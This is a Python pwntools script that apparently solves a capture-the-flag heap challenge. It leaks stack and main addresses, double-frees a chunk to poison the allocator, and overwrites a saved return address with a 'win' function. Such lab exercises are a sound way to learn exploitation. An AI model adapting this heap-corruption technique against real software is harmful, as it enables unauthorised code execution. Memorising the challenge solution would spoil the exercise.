from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("/challenge/sus-sequence-easy")
def malloc(idx,size):
    p.sendlineafter("quit):","malloc "+str(idx)+" "+str(size))
def free(idx):
    p.sendlineafter("quit):","free "+str(idx))
def scanf(idx,payload):
    p.sendlineafter("quit):","scanf "+str(idx))
    p.sendline(payload)
def qt():
    p.sendlineafter("quit):","quit")
buf_len=280
win_base=0x1a00
main_base=0x1afd
p.recvuntil("The local stack address of your allocations is at: 0x",drop=True)
stack_addr=int(p.recv(12),16)
print("Stack_addr:",hex(stack_addr))
p.recvuntil("The address of main is at: 0x",drop=True)
main_addr=int(p.recv(12),16)
print("Main_addr:",hex(main_addr))
win_addr=win_base+main_addr-main_base
malloc(0,100)
free(0)
scanf(0,b'a'*16)
free(0)
scanf(0,p64(stack_addr+buf_len))
malloc(1,100)
malloc(1,100)
scanf(1,p64(win_addr))
qt()
p.recvuntil("pwn")
print(p.recv())
